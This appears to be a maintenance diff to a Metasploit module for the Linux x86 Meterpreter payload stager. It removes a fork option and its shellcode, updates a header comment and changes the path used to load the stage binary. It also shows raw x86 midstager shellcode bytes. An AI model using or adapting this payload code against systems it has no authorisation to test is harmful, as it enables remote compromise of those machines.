@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -24,7 +22,6 @@ module Metasploit3
       'Session'       => Msf::Sessions::Meterpreter_x86_Linux))
 
     register_options([
-      OptBool.new('PrependFork', [ false, "Add a fork() / exit_group() (for parent) code" ]),
       OptInt.new('DebugOptions', [ false, "Debugging options for POSIX meterpreter", 0 ])
     ], self.class)
   end
@@ -71,21 +68,6 @@ module Metasploit3
 
     midstager = "\x81\xc4\x54\xf2\xff\xff" # fix up esp
 
-    if(datastore['PrependFork'])
-      # fork() / parent does exit()
-
-      # If the target process is threaded, this means the thread
-      # will exit. exit_group() will try to close the process down
-      # completely.. and if we do that, it may not be reaped
-      # correctly.
-      #
-      # Plus, depending on the vuln, we might get multiple shots at
-      # owning a finite amount of threads.
-
-      midstager <<
-      "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x06\x31\xc0\xb0\x01\xcd\x80"
-    end
-
     midstager <<
       "\x6a\x04\x5a\x89\xe1\x89\xfb\x6a\x03\x58" +
       "\xcd\x80\x57\xb8\xc0\x00\x00\x00\xbb\x00\x00\x04\x20\x8b\x4c\x24" +
@@ -116,7 +98,7 @@ module Metasploit3
 
   def generate_stage
     #file = File.join(Msf::Config.data_directory, "msflinker_linux_x86.elf")
-    file = File.join(Msf::Config.install_root, "data", "meterpreter", "msflinker_linux_x86.bin")
+    file = File.join(Msf::Config.data_directory, "meterpreter", "msflinker_linux_x86.bin")
 
     met = File.open(file, "rb") {|f|
       f.read(f.stat.size)
